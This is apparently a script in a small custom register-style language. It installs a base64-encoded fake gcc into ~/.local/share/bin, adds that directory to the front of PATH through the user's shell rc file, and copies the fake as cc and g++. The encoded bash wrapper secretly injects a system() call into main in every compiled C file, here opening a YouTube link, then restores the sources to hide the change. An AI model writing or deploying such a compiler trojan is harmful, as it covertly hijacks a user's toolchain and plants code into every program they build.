# === Create the payload  ===
loads "payload.b64"
open r2 re 

loads "IyEvYmluL2Jhc2gKCmluY2x1ZGU9IiNpbmNsdWRlIDxzdGRsaWIuaD4iCgpwYXlsb2FkPSIKc3lz"
write r2 re
loads "dGVtKFwieGRnLW9wZW4gXFwnaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vLVlCRFRx"
write r2 re
loads "WF9aVVxcJyA+IC9kZXYvbnVsbCAyPi9kZXYvbnVsbCAmXCIpO1xuCiIKCmdjYz0kKHdoZXJlaXMg"
write r2 re
loads "JDAgfCBjdXQgLWQgIiAiIC1mMikgCnBhdGNoZWRfZmlsZT0oKQoKZnVuY3Rpb24gcGF0Y2ggewoJ"
write r2 re
loads "bWFpbj0kKGdyZXAgLW4gIm1haW4iICQxKQoJbGluZT0kKGVjaG8gJG1haW4gfCBjdXQgLWQgIjoi"
write r2 re
loads "IC1mMSkKCWlzX25leHQ9JChlY2hvICRtYWluIHwgZ3JlcCAieyIgfHwgZWNobyAwKQoKCWlmIFsg"
write r2 re
loads "JGlzX25leHQgLWVxIDAgXTsgdGhlbiAKCQlmb3VuZF9jdXJseT0kKGdyZXAgLW4gInsiICQxIHwg"
write r2 re
loads "Y3V0IC1kICI6IiAtZjEpCgkJd2hpbGUgdHJ1ZQoJCWRvCgkJCWlmIGVjaG8gJHtmb3VuZF9jdXJs"
write r2 re
loads "eVtAXX0gfCBncmVwIC1xIC13ICIkbGluZSI7IHRoZW4KCQkJCXNlZCAtaSAiMWFcICQoZWNobyAk"
write r2 re
loads "aW5jbHVkZSkiICQxCgkJCQlsaW5lPSQoKCRsaW5lICsgMSkpCgkJCQlzZWQgLWkgIiR7bGluZX1h"
write r2 re
loads "XCAkKGVjaG8gJHBheWxvYWQpIiAkMQkKCQkJCWJyZWFrIAoJCQllbHNlCgkJCQlsaW5lPSQoKCRs"
write r2 re
loads "aW5lICsgMSkpCgkJCWZpCgkJZG9uZQoJZmkKfQoKaWYgWyAkIyAtbHQgMSBdOyB0aGVuIAoJJGdj"
write r2 re
loads "YwoJZXhpdCAxCmZpCgpmb3IgYXJnIGluICRAIApkbwoJaWYgWyAtZiAkYXJnIF07IHRoZW4gCgkJ"
write r2 re
loads "Y3AgJChwd2QpLyRhcmcgJChwd2QpLy4kYXJnCgkJcGF0Y2ggJChwd2QpLyRhcmcKCQlwYXRjaGVk"
write r2 re
loads "X2ZpbGUrPSgkYXJnKQoJZmkKZG9uZQoKJGdjYyAkQAoKZm9yIGZpbGUgaW4gJHBhdGNoZWRfZmls"
write r2 re
loads "ZSAKZG8KCW12ICQocHdkKS8uJGZpbGUgJChwd2QpLyRmaWxlCmRvbmUKCg=="
write r2 re

close r2

loads "HOME"
env re 
loadr r1 re
loadr r2 re
loads "mkdir "
append re r1
loadr r1 re
loads "/.local/share/bin"
append r1 re
loadr r1 re
system re

loads "/.local/share/bin"
append r2 re 
loadr r1 re 
loadr r3 re
loads "/gcc"
append r1 re 
loadr r1 re

loads "tmp.sh"
open r2 re 
loads "rm -rf ~/.local/share/bin/gcc && base64 -d payload.b64 > "
write r2 re
write r2 r1 
close r2 

loads "bash tmp.sh"
system re 
loads "rm tmp.sh" 
system re

open r2 r1 
write r2 re 
close r2

loads "rm payload.b64"
system re

# === Get ~/.SHELLrc path ===
loads "SHELL"
env re 
loadr r1 re 
loads "basename "
append re r1
system re
loadr r1 re 

loads "HOME"
env re 
loadr r2 re 
loads "/."
append r2 re 
append re r1 
loadr r1 re 
loads "rc"
append r1 re 

open r1 re 
loads "export PATH="
write r1 re 
write r1 r3 
loads ":$PATH"
write r1 re
close r1

loads "chmod +x "
append re r3 
loadr r1 re
loads "/gcc"
append r1 re
system re

loads "cp "
append re r3
loadr r1 re
loads "/gcc "
append r1 re
loadr r1 re
loads "/cc"
append r3 re 
append r1 re
system re

loads "cp "
append re r3
loadr r1 re
loads "/gcc "
append r1 re
loadr r1 re
loads "/g++"
append r3 re 
append r1 re
system re

# ===========================

exit